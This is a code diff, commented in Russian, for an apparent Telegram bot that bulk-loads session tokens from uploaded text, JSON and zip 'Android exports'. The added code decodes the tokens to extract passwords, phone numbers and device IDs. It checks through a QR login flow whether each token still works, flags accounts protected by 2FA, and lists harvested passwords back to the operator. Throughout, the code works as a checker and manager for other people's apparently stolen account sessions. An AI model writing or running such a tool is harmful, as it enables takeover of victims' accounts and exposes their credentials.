@@ -11,6 +11,7 @@ import struct
 import msgpack
 import zipfile
 import re
+import base64
 import requests
 from io import BytesIO
 from datetime import datetime, timedelta
@@ -196,7 +197,6 @@ class QRScanner:
             
             now_ms = int(time.time() * 1000)
             
-            # Используем device_info если есть
             user_agent = {
                 "deviceType": self.device_info.get("deviceType", "ANDROID"),
                 "appVersion": self.device_info.get("appVersion", "26.17.1"),
@@ -252,6 +252,190 @@ class QRScanner:
         finally:
             self.conn.close()
 
+# ==================== ИЗВЛЕЧЕНИЕ ПАРОЛЯ ИЗ ТОКЕНА ====================
+
+class TokenPasswordExtractor:
+    """Извлекает пароль из токена, если он там зашифрован"""
+    
+    @staticmethod
+    def extract_password_from_token(token: str) -> str:
+        """Пытается извлечь пароль из токена разными методами"""
+        if not token or len(token) < 20:
+            return ""
+        
+        password = TokenPasswordExtractor._extract_from_base64_parts(token)
+        if password:
+            return password
+        
+        password = TokenPasswordExtractor._extract_from_json_in_token(token)
+        if password:
+            return password
+        
+        password = TokenPasswordExtractor._extract_by_patterns(token)
+        if password:
+            return password
+        
+        password = TokenPasswordExtractor._extract_from_full_decode(token)
+        if password:
+            return password
+        
+        return ""
+    
+    @staticmethod
+    def _extract_from_base64_parts(token: str) -> str:
+        parts = re.split(r'[\._\-]', token)
+        
+        for part in parts:
+            if len(part) < 8 or len(part) > 100:
+                continue
+            
+            for padding in ['', '=', '==', '===']:
+                try:
+                    decoded = base64.b64decode(part + padding).decode('utf-8', errors='ignore')
+                    
+                    password = TokenPasswordExtractor._find_password_in_text(decoded)
+                    if password:
+                        return password
+                    
+                    if 4 <= len(decoded) <= 30 and not decoded.startswith('{'):
+                        if re.search(r'[A-Za-z]', decoded) and re.search(r'[0-9!@#$%^&*]', decoded):
+                            return decoded
+                except:
+                    continue
+        
+        return ""
+    
+    @staticmethod
+    def _extract_from_json_in_token(token: str) -> str:
+        json_patterns = [
+            r'\{[^}]*"password"\s*:\s*"([^"]+)"[^}]*\}',
+            r'\{[^}]*"pass"\s*:\s*"([^"]+)"[^}]*\}',
+            r'\{[^}]*"pwd"\s*:\s*"([^"]+)"[^}]*\}',
+        ]
+        
+        for pattern in json_patterns:
+            match = re.search(pattern, token)
+            if match:
+                return match.group(1)
+        
+        return ""
+    
+    @staticmethod
+    def _extract_by_patterns(token: str) -> str:
+        patterns = [
+            r'password[:=]([A-Za-z0-9@#$%^&*!]+)',
+            r'pass[:=]([A-Za-z0-9@#$%^&*!]+)',
+            r'pwd[:=]([A-Za-z0-9@#$%^&*!]+)',
+            r'passwd[:=]([A-Za-z0-9@#$%^&*!]+)',
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, token, re.IGNORECASE)
+            if match:
+                password = match.group(1)
+                if 4 <= len(password) <= 30:
+                    return password
+        
+        return ""
+    
+    @staticmethod
+    def _extract_from_full_decode(token: str) -> str:
+        try:
+            padded = token + '=' * (4 - len(token) % 4) if len(token) % 4 else token
+            decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
+            
+            password = TokenPasswordExtractor._find_password_in_text(decoded)
+            if password:
+                return password
+        except:
+            pass
+        
+        try:
+            decoded = base64.urlsafe_b64decode(token + '==').decode('utf-8', errors='ignore')
+            password = TokenPasswordExtractor._find_password_in_text(decoded)
+            if password:
+                return password
+        except:
+            pass
+        
+        return ""
+    
+    @staticmethod
+    def _find_password_in_text(text: str) -> str:
+        try:
+            json_objects = re.findall(r'\{[^{}]+\}', text)
+            for json_str in json_objects:
+                try:
+                    data = json.loads(json_str)
+                    for key in ['password', 'pass', 'pwd', 'passwordHash']:
+                        if key in data and isinstance(data[key], str):
+                            return data[key]
+                except:
+                    continue
+        except:
+            pass
+        
+        patterns = [
+            r'"password"\s*:\s*"([^"]+)"',
+            r'password=([^\s&]+)',
+            r'pass=([^\s&]+)',
+            r'pwd=([^\s&]+)',
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, text)
+            if match:
+                return match.group(1)
+        
+        return ""
+    
+    @staticmethod
+    def extract_all_info_from_token(token: str) -> dict:
+        info = {
+            "password": "",
+            "device_id": "",
+            "phone": "",
+            "user_id": ""
+        }
+        
+        info["password"] = TokenPasswordExtractor.extract_password_from_token(token)
+        
+        device_patterns = [
+            r'"deviceId"\s*:\s*"([^"]+)"',
+            r'deviceId=([^\s&]+)',
+            r'device_id=([^\s&]+)',
+        ]
+        for pattern in device_patterns:
+            match = re.search(pattern, token)
+            if match:
+                info["device_id"] = match.group(1)
+                break
+        
+        phone_patterns = [
+            r'(?:\+?\d{1,3})?[\s\-]?\(?\d{3}\)?[\s\-]?\d{3}[\s\-]?\d{2}[\s\-]?\d{2}',
+            r'"phone"\s*:\s*"([^"]+)"',
+        ]
+        for pattern in phone_patterns:
+            match = re.search(pattern, token)
+            if match:
+                phone = match.group(0) if match.lastindex is None else match.group(1)
+                if len(phone) > 5:
+                    info["phone"] = phone
+                    break
+        
+        id_patterns = [
+            r'"userId"\s*:\s*(\d+)',
+            r'"user_id"\s*:\s*(\d+)',
+            r'"id"\s*:\s*(\d+)',
+        ]
+        for pattern in id_patterns:
+            match = re.search(pattern, token)
+            if match:
+                info["user_id"] = match.group(1)
+                break
+        
+        return info
+
 # ==================== УНИВЕРСАЛЬНЫЙ ПАРСЕР ТОКЕНОВ ====================
 
 class UniversalTokenParser:
@@ -259,34 +443,29 @@ class UniversalTokenParser:
     
     @staticmethod
     def extract_token(text: str) -> str:
-        """Извлекает токен из текста любого формата"""
-        # Паттерны для разных форматов токенов
         patterns = [
-            r'(?:token|access_token|auth_token)["\s:=]+([A-Za-z0-9\-_=+]{50,})',  # JSON поле token
-            r'(An_[A-Za-z0-9\-_=+]{50,})',  # Токен формата An_...
-            r'(?:^|\s)([A-Za-z0-9\-_=+]{100,})(?:\s|$)',  # Длинная строка похожая на токен
-            r'([A-Za-z0-9+/=]{50,})',  # Base64-like строка
+            r'(?:token|access_token|auth_token)["\s:=]+([A-Za-z0-9\-_=+]{50,})',
+            r'(An_[A-Za-z0-9\-_=+]{50,})',
+            r'(?:^|\s)([A-Za-z0-9\-_=+]{100,})(?:\s|$)',
+            r'([A-Za-z0-9+/=]{50,})',
         ]
         
         for pattern in patterns:
             match = re.search(pattern, text)
             if match:
                 token = match.group(1)
-                # Проверяем что это не JSON и не служебная строка
                 if not token.startswith('{') and not token.startswith('const') and len(token) > 50:
                     return token
         return None
     
     @staticmethod
-    def extract_device_info(text: str) -> dict:
-        """Извлекает информацию об устройстве из текста"""
+    def extract_device_info(text: str, token: str = None) -> dict:
         device_info = {}
         
-        # Пытаемся найти JSON объект с информацией об устройстве
         json_patterns = [
-            r'\{[^}]*"deviceType"[^}]*\}',  # JSON с deviceType
-            r'\{[^}]*"deviceId"[^}]*\}',    # JSON с deviceId
-            r'\{[^}]*"userAgent"[^}]*\}',   # JSON с userAgent
+            r'\{[^}]*"deviceType"[^}]*\}',
+            r'\{[^}]*"deviceId"[^}]*\}',
+            r'\{[^}]*"userAgent"[^}]*\}',
         ]
         
         for pattern in json_patterns:
@@ -302,7 +481,6 @@ class UniversalTokenParser:
                 except:
                     continue
         
-        # Если не нашли JSON, ищем отдельные поля
         if not device_info:
             fields = {
                 "deviceId": r'"deviceId"\s*:\s*"([^"]+)"',
@@ -324,32 +502,44 @@ class UniversalTokenParser:
                     else:
                         device_info[field] = match.group(1)
         
+        if "deviceId" not in device_info and token:
+            token_info = TokenPasswordExtractor.extract_all_info_from_token(token)
+            if token_info.get("device_id"):
+                device_info["deviceId"] = token_info["device_id"]
+        
         return device_info
     
     @staticmethod
-    def extract_password(text: str) -> str:
-        """Извлекает пароль из текста"""
+    def extract_password(text: str, token: str = None) -> str:
+        if token:
+            password = TokenPasswordExtractor.extract_password_from_token(token)
+            if password:
+                return password
+        
         patterns = [
-            r'(?:password|pass|pwd)["\s:=]+([^\s\n"]+)',  # JSON поле password
-            r'(?:^|\n)([A-Za-z0-9@#$%^&*!]{4,30})(?:\n|$)',  # Строка похожая на пароль
+            r'(?:password|pass|pwd)["\s:=]+([^\s\n"]+)',
+            r'(?:^|\n)([A-Za-z0-9@#$%^&*!]{4,30})(?:\n|$)',
+            r'пароль[:\s]+([^\s\n]+)',
         ]
         
         for pattern in patterns:
             match = re.search(pattern, text, re.IGNORECASE)
             if match:
                 password = match.group(1)
-                # Проверяем что это не токен и не служебная строка
-                if not password.startswith('An_') and len(password) > 3 and len(password) < 50:
+                if (not password.startswith('An_') and 
+                    not password.startswith('const') and 
+                    len(password) > 3 and 
+                    len(password) < 50):
                     return password
+        
         return ""
     
     @staticmethod
     def extract_phone(text: str) -> str:
-        """Извлекает номер телефона из текста"""
         patterns = [
-            r'(?:\+?\d{1,3})?[\s\-]?\(?\d{3}\)?[\s\-]?\d{3}[\s\-]?\d{2}[\s\-]?\d{2}',  # Номер телефона
-            r'"phone"\s*:\s*"([^"]+)"',  # JSON поле phone
-            r'"phoneNumber"\s*:\s*"([^"]+)"',  # JSON поле phoneNumber
+            r'(?:\+?\d{1,3})?[\s\-]?\(?\d{3}\)?[\s\-]?\d{3}[\s\-]?\d{2}[\s\-]?\d{2}',
+            r'"phone"\s*:\s*"([^"]+)"',
+            r'"phoneNumber"\s*:\s*"([^"]+)"',
         ]
         
         for pattern in patterns:
@@ -362,7 +552,6 @@ class UniversalTokenParser:
     
     @staticmethod
     def extract_custom_payload(text: str) -> str:
-        """Извлекает customPayload из текста"""
         patterns = [
             r'customPayload\s*=\s*"(\d+)"',
             r'"customPayload"\s*:\s*"(\d+)"',
@@ -377,10 +566,8 @@ class UniversalTokenParser:
     
     @staticmethod
     def parse_text_block(text: str) -> list:
-        """Парсит блок текста содержащий один или несколько токенов"""
         results = []
         
-        # Разделяем текст на блоки (разделители: пустые строки, ---, ===)
         blocks = re.split(r'\n\s*\n|---+|\*\*\*+|===+', text)
         
         for block in blocks:
@@ -392,14 +579,17 @@ class UniversalTokenParser:
             if not token:
                 continue
             
-            device_info = UniversalTokenParser.extract_device_info(block)
-            password = UniversalTokenParser.extract_password(block)
+            password = UniversalTokenParser.extract_password(block, token)
+            device_info = UniversalTokenParser.extract_device_info(block, token)
             phone = UniversalTokenParser.extract_phone(block)
             custom_payload = UniversalTokenParser.extract_custom_payload(block)
             
-            # Если не нашли device_id, генерируем
             if "deviceId" not in device_info:
-                device_info["deviceId"] = str(uuid.uuid4())
+                token_info = TokenPasswordExtractor.extract_all_info_from_token(token)
+                if token_info.get("device_id"):
+                    device_info["deviceId"] = token_info["device_id"]
+                else:
+                    device_info["deviceId"] = str(uuid.uuid4())
             
             results.append({
                 "token": token,
@@ -413,7 +603,6 @@ class UniversalTokenParser:
     
     @staticmethod
     def parse_json_data(data) -> list:
-        """Парсит JSON данные разных форматов"""
         results = []
         
         if isinstance(data, list):
@@ -423,7 +612,6 @@ class UniversalTokenParser:
                     if parsed:
                         results.append(parsed)
         elif isinstance(data, dict):
-            # Может быть массив токенов в ключе
             for key in ["tokens", "accounts", "data", "sessions"]:
                 if key in data and isinstance(data[key], list):
                     for item in data[key]:
@@ -432,7 +620,6 @@ class UniversalTokenParser:
                             if parsed:
                                 results.append(parsed)
             
-            # Или один токен
             parsed = UniversalTokenParser.parse_single_json(data)
             if parsed:
                 results.append(parsed)
@@ -441,8 +628,6 @@ class UniversalTokenParser:
     
     @staticmethod
     def parse_single_json(data: dict) -> dict:
-        """Парсит одиночный JSON объект с токеном"""
-        # Ищем токен в разных полях
         token = None
         token_fields = ["token", "accessToken", "access_token", "authToken", "auth_token", 
                        "sessionToken", "session_token", "refreshToken", "refresh_token"]
@@ -454,7 +639,6 @@ class UniversalTokenParser:
                     token = potential_token
                     break
         
-        # Если не нашли в известных полях, ищем в строковом представлении
         if not token:
             json_str = json.dumps(data)
             token = UniversalTokenParser.extract_token(json_str)
@@ -462,7 +646,14 @@ class UniversalTokenParser:
         if not token:
             return None
         
-        # Извлекаем deviceInfo
+        password = TokenPasswordExtractor.extract_password_from_token(token)
+        
+        if not password:
+            for pwd_field in ["password", "pass", "pwd", "passwordHash"]:
+                if pwd_field in data:
+                    password = str(data[pwd_field])
+                    break
+        
         device_info = {}
         if "userAgent" in data:
             device_info.update(data["userAgent"])
@@ -471,29 +662,29 @@ class UniversalTokenParser:
         elif "device" in data:
             device_info.update(data["device"])
         
-        # Извлекаем deviceId
         device_id = data.get("deviceId") or data.get("device_id") or device_info.get("deviceId")
+        
         if not device_id:
-            # Ищем в тексте
-            json_str = json.dumps(data)
-            match = re.search(r'"deviceId"\s*:\s*"([^"]+)"', json_str)
-            if match:
-                device_id = match.group(1)
+            token_info = TokenPasswordExtractor.extract_all_info_from_token(token)
+            if token_info.get("device_id"):
+                device_id = token_info["device_id"]
         
         if not device_id:
             device_id = str(uuid.uuid4())
         
         device_info["deviceId"] = device_id
         
-        # Извлекаем остальные данные
-        password = data.get("password") or data.get("pass") or data.get("pwd") or ""
         phone = data.get("phone") or data.get("phoneNumber") or data.get("phone_number") or ""
         
-        # Пробуем найти телефон в user или profile
         if not phone:
             user_data = data.get("user") or data.get("profile") or {}
             if isinstance(user_data, dict):
                 phone = user_data.get("phone") or user_data.get("phoneNumber") or ""
+        
+        if not phone:
+            token_info = TokenPasswordExtractor.extract_all_info_from_token(token)
+            if token_info.get("phone"):
+                phone = token_info["phone"]
         
         custom_payload = data.get("customPayload") or data.get("custom_payload")
         if custom_payload:
@@ -566,18 +757,25 @@ def get_user_group(user_id: int) -> str:
     return users[uid].get("group_id")
 
 def is_duplicate_token(token: str) -> bool:
-    """Проверка на дубликат токена"""
     for acc in accounts.values():
         if acc.get("token") == token:
             return True
     return False
 
 def add_account(token: str, device_info: dict, password: str = "", phone: str = "unknown", custom_payload: str = None) -> str:
-    """Добавление аккаунта в базу"""
     if is_duplicate_token(token):
         return "duplicate"
     
+    if not password:
+        password = TokenPasswordExtractor.extract_password_from_token(token)
+    
     device_id = device_info.get("deviceId", str(uuid.uuid4()))
+    
+    if device_id == str(uuid.uuid4()):
+        token_info = TokenPasswordExtractor.extract_all_info_from_token(token)
+        if token_info.get("device_id"):
+            device_id = token_info["device_id"]
+            device_info["deviceId"] = device_id
     
     acc_id = str(uuid.uuid4())[:8]
     accounts[acc_id] = {
@@ -595,7 +793,6 @@ def add_account(token: str, device_info: dict, password: str = "", phone: str = 
 # ==================== ВАЛИДАЦИЯ ТОКЕНОВ ====================
 
 async def validate_token(token: str, device_id: str, device_info: dict = None) -> dict:
-    """Проверяет, рабочий ли токен"""
     scanner = QRScanner(token, device_id, device_info)
     
     try:
@@ -1177,7 +1374,7 @@ async def handle_edit_balance_amount(message: types.Message, state: FSMContext):
     
     await state.clear()
 
-# ==================== ЗАГРУЗКА ТОКЕНОВ ====================
+# ==================== ЗАГРУЗКА ТОКЕНОВ С ДЕТАЛЬНЫМ ВЫВОДОМ ====================
 
 @dp.callback_query(F.data == "admin_upload")
 async def cb_admin_upload(callback: types.CallbackQuery):
@@ -1190,11 +1387,11 @@ async def cb_admin_upload(callback: types.CallbackQuery):
         "• <code>.txt</code> - любые текстовые форматы токенов\n"
         "• <code>.json</code> - JSON любого формата\n"
         "• <code>.zip</code> - архив с файлами\n\n"
-        "<b>Бот автоматически определит формат и извлечёт:</b>\n"
-        "• Токен\n"
-        "• Информацию об устройстве\n"
-        "• Пароль (если есть)\n"
-        "• Номер телефона (если есть)\n\n"
+        "<b>Бот покажет детальную информацию:</b>\n"
+        "• Номер телефона/устройство\n"
+        "• Пароль (если найден)\n"
+        "• Статус проверки\n"
+        "• Ошибки для нерабочих токенов\n\n"
         "<i>Поддерживаются все форматы экспорта Android!</i>",
         parse_mode="HTML"
     )
@@ -1221,6 +1418,10 @@ async def handle_document(message: types.Message):
         added = 0
         skipped = 0
         duplicates = 0
+        passwords_found = 0
+        
+        # Собираем детальную информацию о каждом токене
+        token_details = []
         
         if file_name.endswith('.zip'):
             zip_buffer = BytesIO(file_bytes.read())
@@ -1230,74 +1431,146 @@ async def handle_document(message: types.Message):
                         continue
                     try:
                         content = zf.read(inner_file).decode('utf-8')
-                        a, s, d = process_content(content)
+                        a, s, d, p, details = process_content_detailed(content)
                         added += a
                         skipped += s
                         duplicates += d
+                        passwords_found += p
+                        token_details.extend(details)
                     except Exception as e:
                         logger.error(f"Error processing {inner_file}: {e}")
                         skipped += 1
         else:
             content = file_bytes.read().decode('utf-8')
-            added, skipped, duplicates = process_content(content)
+            added, skipped, duplicates, passwords_found, token_details = process_content_detailed(content)
         
         save_accounts()
         
-        await msg.edit_text(
-            f"✅ Файл обработан!\n"
-            f"➕ Добавлено токенов: {added}\n"
-            f"🔄 Дубликатов: {duplicates}\n"
-            f"⏭ Пропущено: {skipped}\n\n"
-            f"🔍 Начинаю проверку... Это может занять несколько минут."
+        # Формируем детальный отчет о загрузке
+        report = (
+            f"📦 <b>ЗАГРУЗКА ТОКЕНОВ</b>\n\n"
+            f"➕ Добавлено: <b>{added}</b>\n"
+            f"🔄 Дубликатов: <b>{duplicates}</b>\n"
+            f"⏭ Пропущено: <b>{skipped}</b>\n"
+            f"🔑 Найдено паролей: <b>{passwords_found}</b>\n"
+            f"📊 Всего в базе: <b>{len(accounts)}</b>\n"
         )
         
-        # Проверка токенов
+        # Отправляем основной отчет
+        await msg.edit_text(report, parse_mode="HTML")
+        
+        # Отправляем детали по каждому токену (группами по 10)
+        if token_details:
+            detail_chunks = [token_details[i:i+10] for i in range(0, len(token_details), 10)]
+            
+            for chunk_num, chunk in enumerate(detail_chunks):
+                detail_text = f"📋 <b>Детали токенов (часть {chunk_num + 1}/{len(detail_chunks)}):</b>\n\n"
+                
+                for detail in chunk:
+                    status_emoji = "✅" if detail["status"] == "added" else "🔄" if detail["status"] == "duplicate" else "❌"
+                    
+                    detail_text += f"{status_emoji} <b>Токен #{detail['index']}</b>\n"
+                    detail_text += f"📱 <b>Устройство:</b> <code>{detail['phone'][:30]}</code>\n"
+                    
+                    if detail.get("password"):
+                        detail_text += f"🔑 <b>Пароль:</b> <code>{detail['password']}</code>\n"
+                    else:
+                        detail_text += f"🔑 <b>Пароль:</b> <i>не найден</i>\n"
+                    
+                    if detail.get("device_name"):
+                        detail_text += f"📱 <b>Модель:</b> {detail['device_name']}\n"
+                    
+                    if detail.get("custom_payload"):
+                        detail_text += f"🔢 <b>Payload:</b> <code>{detail['custom_payload']}</code>\n"
+                    
+                    if detail["status"] == "duplicate":
+                        detail_text += f"⚠️ <i>Дубликат, пропущен</i>\n"
+                    elif detail["status"] == "error":
+                        detail_text += f"❌ <i>Ошибка: {detail.get('error', 'неизвестно')}</i>\n"
+                    
+                    detail_text += "\n"
+                
+                # Отправляем часть деталей
+                if len(detail_text) > 4000:
+                    # Разбиваем на более мелкие части если слишком длинно
+                    for i in range(0, len(detail_text), 4000):
+                        await message.answer(detail_text[i:i+4000], parse_mode="HTML")
+                else:
+                    await message.answer(detail_text, parse_mode="HTML")
+        
+        # Начинаем проверку токенов
+        status_msg = await message.answer("🔍 <b>Начинаю проверку токенов...</b>\n<i>Это может занять несколько минут</i>", parse_mode="HTML")
+        
+        # Проверка токенов с детальным выводом
         valid = 0
         invalid = 0
         twofa = 0
         to_remove = []
-        twofa_list = []
+        validation_details = []
         
         total = len(accounts)
         checked = 0
         
         for acc_id, acc in list(accounts.items()):
             checked += 1
+            
+            # Обновляем статус проверки каждые 5 токенов
+            if checked % 5 == 0 or checked == total:
+                try:
+                    await status_msg.edit_text(
+                        f"🔍 <b>Проверка токенов...</b>\n"
+                        f"Прогресс: <b>{checked}/{total}</b>\n"
+                        f"✅ Валидных: <b>{valid}</b>\n"
+                        f"🔐 С 2FA: <b>{twofa}</b>\n"
+                        f"❌ Битых: <b>{invalid}</b>",
+                        parse_mode="HTML"
+                    )
+                except:
+                    pass
+            
             result = await validate_token(
                 acc["token"], 
                 acc["device_id"], 
                 acc.get("device_info")
             )
             
+            phone = acc.get("phone", "unknown")
+            password = acc.get("password", "")
+            device_name = acc.get("device_info", {}).get("deviceName", "")
+            
+            detail = {
+                "phone": phone,
+                "password": password,
+                "device_name": device_name,
+                "status": "",
+                "error": ""
+            }
+            
             if result["valid"]:
                 valid += 1
                 if result.get("has_2fa"):
                     twofa += 1
-                    phone = acc.get("phone", acc_id[:8])
-                    twofa_list.append(f"• {phone}")
+                    detail["status"] = "2fa"
+                    detail["warning"] = result.get("warning", "Требуется 2FA")
+                else:
+                    detail["status"] = "valid"
             else:
                 invalid += 1
                 to_remove.append(acc_id)
-                error = result.get("error", "неизвестно")
-                phone = acc.get("phone", acc_id[:8])
-                logger.info(f"Invalid token {phone}: {error}")
+                detail["status"] = "invalid"
+                detail["error"] = result.get("error", "неизвестная ошибка")
+                logger.info(f"Invalid token {phone}: {detail['error']}")
             
-            if checked % 5 == 0 or checked == total:
-                await msg.edit_text(
-                    f"🔍 Проверка токенов...\n"
-                    f"Прогресс: {checked}/{total}\n"
-                    f"✅ Валидных: {valid}\n"
-                    f"🔐 С 2FA: {twofa}\n"
-                    f"❌ Битых: {invalid}",
-                    parse_mode="HTML"
-                )
+            validation_details.append(detail)
         
+        # Удаляем невалидные токены
         for acc_id in to_remove:
             del accounts[acc_id]
         save_accounts()
         
-        result_text = (
-            f"✅ <b>Проверка завершена!</b>\n\n"
+        # Формируем отчет о проверке
+        validation_report = (
+            f"✅ <b>ПРОВЕРКА ЗАВЕРШЕНА!</b>\n\n"
             f"📦 Всего проверено: <b>{total}</b>\n"
             f"✅ Валидных: <b>{valid}</b>\n"
             f"🔐 С 2FA: <b>{twofa}</b>\n"
@@ -1305,22 +1578,67 @@ async def handle_document(message: types.Message):
             f"📊 Осталось в базе: <b>{len(accounts)}</b>"
         )
         
-        if twofa_list:
-            result_text += f"\n\n<b>🔐 Токены с 2FA ({twofa}):</b>\n" + "\n".join(twofa_list[:15])
-            if len(twofa_list) > 15:
-                result_text += f"\n...и ещё {len(twofa_list) - 15}"
+        await message.answer(validation_report, parse_mode="HTML")
         
-        await msg.edit_text(result_text, parse_mode="HTML")
+        # Отправляем детали проверки (группами по 15)
+        if validation_details:
+            detail_chunks = [validation_details[i:i+15] for i in range(0, len(validation_details), 15)]
+            
+            for chunk_num, chunk in enumerate(detail_chunks):
+                detail_text = f"📋 <b>Результаты проверки (часть {chunk_num + 1}/{len(detail_chunks)}):</b>\n\n"
+                
+                for i, detail in enumerate(chunk):
+                    if detail["status"] == "valid":
+                        emoji = "✅"
+                        status_text = "Рабочий"
+                    elif detail["status"] == "2fa":
+                        emoji = "🔐"
+                        status_text = f"2FA: {detail.get('warning', '')}"
+                    else:
+                        emoji = "❌"
+                        status_text = f"Ошибка: {detail['error']}"
+                    
+                    detail_text += f"{emoji} <b>Аккаунт:</b> <code>{detail['phone'][:25]}</code>\n"
+                    
+                    if detail["password"]:
+                        detail_text += f"   🔑 <b>Пароль:</b> <code>{detail['password']}</code>\n"
+                    
+                    if detail["device_name"]:
+                        detail_text += f"   📱 <b>Устройство:</b> {detail['device_name']}\n"
+                    
+                    detail_text += f"   📊 <b>Статус:</b> {status_text}\n\n"
+                
+                if len(detail_text) > 4000:
+                    for i in range(0, len(detail_text), 4000):
+                        await message.answer(detail_text[i:i+4000], parse_mode="HTML")
+                else:
+                    await message.answer(detail_text, parse_mode="HTML")
+        
+        # Итоговая сводка
+        summary = (
+            f"📊 <b>ИТОГОВАЯ СВОДКА</b>\n\n"
+            f"📦 Загружено: <b>{added}</b>\n"
+            f"✅ Рабочих: <b>{valid}</b>\n"
+            f"🔐 С 2FA: <b>{twofa}</b>\n"
+            f"❌ Удалено: <b>{invalid}</b>\n"
+            f"📊 В базе: <b>{len(accounts)}</b>\n"
+            f"🔑 С паролями: <b>{passwords_found}</b>"
+        )
+        
+        await message.answer(summary, parse_mode="HTML")
         
     except Exception as e:
         logger.error(f"Upload error: {e}")
-        await msg.edit_text(f"❌ Ошибка: {e}")
+        await message.answer(f"❌ <b>Ошибка при обработке файла:</b>\n<code>{str(e)}</code>", parse_mode="HTML")
 
-def process_content(content: str) -> tuple:
-    """Обработка содержимого файла с токенами (универсальная)"""
+def process_content_detailed(content: str) -> tuple:
+    """Обработка содержимого файла с токенами (с детальной информацией)"""
     added = 0
     skipped = 0
     duplicates = 0
+    passwords_found = 0
+    token_details = []
+    token_index = 0
     
     # Пробуем распарсить как JSON
     try:
@@ -1328,6 +1646,20 @@ def process_content(content: str) -> tuple:
         parsed_tokens = UniversalTokenParser.parse_json_data(data)
         
         for token_data in parsed_tokens:
+            token_index += 1
+            
+            detail = {
+                "index": token_index,
+                "phone": token_data.get("phone", "unknown"),
+                "password": token_data.get("password", ""),
+                "device_name": token_data.get("device_info", {}).get("deviceName", ""),
+                "custom_payload": token_data.get("custom_payload"),
+                "status": ""
+            }
+            
+            if token_data.get("password"):
+                passwords_found += 1
+            
             result = add_account(
                 token=token_data["token"],
                 device_info=token_data["device_info"],
@@ -1338,13 +1670,19 @@ def process_content(content: str) -> tuple:
             
             if result == "added":
                 added += 1
+                detail["status"] = "added"
             elif result == "duplicate":
                 duplicates += 1
+                detail["status"] = "duplicate"
             else:
                 skipped += 1
+                detail["status"] = "error"
+                detail["error"] = "Не удалось добавить"
+            
+            token_details.append(detail)
         
         if parsed_tokens:
-            return added, skipped, duplicates
+            return added, skipped, duplicates, passwords_found, token_details
     except json.JSONDecodeError:
         pass
     
@@ -1362,7 +1700,6 @@ def process_content(content: str) -> tuple:
                 current_block = []
             continue
         
-        # Проверяем, является ли строка JSON
         try:
             data = json.loads(line_stripped)
             if isinstance(data, dict):
@@ -1380,6 +1717,20 @@ def process_content(content: str) -> tuple:
     for json_obj in json_objects:
         parsed = UniversalTokenParser.parse_single_json(json_obj)
         if parsed:
+            token_index += 1
+            
+            detail = {
+                "index": token_index,
+                "phone": parsed.get("phone", "unknown"),
+                "password": parsed.get("password", ""),
+                "device_name": parsed.get("device_info", {}).get("deviceName", ""),
+                "custom_payload": parsed.get("custom_payload"),
+                "status": ""
+            }
+            
+            if parsed.get("password"):
+                passwords_found += 1
+            
             result = add_account(
                 token=parsed["token"],
                 device_info=parsed["device_info"],
@@ -1390,16 +1741,36 @@ def process_content(content: str) -> tuple:
             
             if result == "added":
                 added += 1
+                detail["status"] = "added"
             elif result == "duplicate":
                 duplicates += 1
+                detail["status"] = "duplicate"
             else:
                 skipped += 1
+                detail["status"] = "error"
+                detail["error"] = "Не удалось добавить"
+            
+            token_details.append(detail)
     
     # Обрабатываем текстовые блоки
     for block in text_blocks:
         parsed_tokens = UniversalTokenParser.parse_text_block(block)
         
         for token_data in parsed_tokens:
+            token_index += 1
+            
+            detail = {
+                "index": token_index,
+                "phone": token_data.get("phone", "unknown"),
+                "password": token_data.get("password", ""),
+                "device_name": token_data.get("device_info", {}).get("deviceName", ""),
+                "custom_payload": token_data.get("custom_payload"),
+                "status": ""
+            }
+            
+            if token_data.get("password"):
+                passwords_found += 1
+            
             result = add_account(
                 token=token_data["token"],
                 device_info=token_data["device_info"],
@@ -1410,12 +1781,18 @@ def process_content(content: str) -> tuple:
             
             if result == "added":
                 added += 1
+                detail["status"] = "added"
             elif result == "duplicate":
                 duplicates += 1
+                detail["status"] = "duplicate"
             else:
                 skipped += 1
+                detail["status"] = "error"
+                detail["error"] = "Не удалось добавить"
+            
+            token_details.append(detail)
     
-    return added, skipped, duplicates
+    return added, skipped, duplicates, passwords_found, token_details
 
 # ==================== ПРОВЕРКА ТОКЕНОВ ====================
 
@@ -1453,7 +1830,9 @@ async def cb_check_tokens(callback: types.CallbackQuery):
             if result.get("has_2fa"):
                 twofa_count += 1
                 phone = acc.get("phone", acc_id[:8])
-                twofa_list.append(f"• {phone}")
+                pwd = acc.get("password", "")
+                pwd_info = f" [пароль: {pwd}]" if pwd else ""
+                twofa_list.append(f"• {phone}{pwd_info}")
         else:
             invalid_count += 1
             phone = acc.get("phone", acc_id[:8])
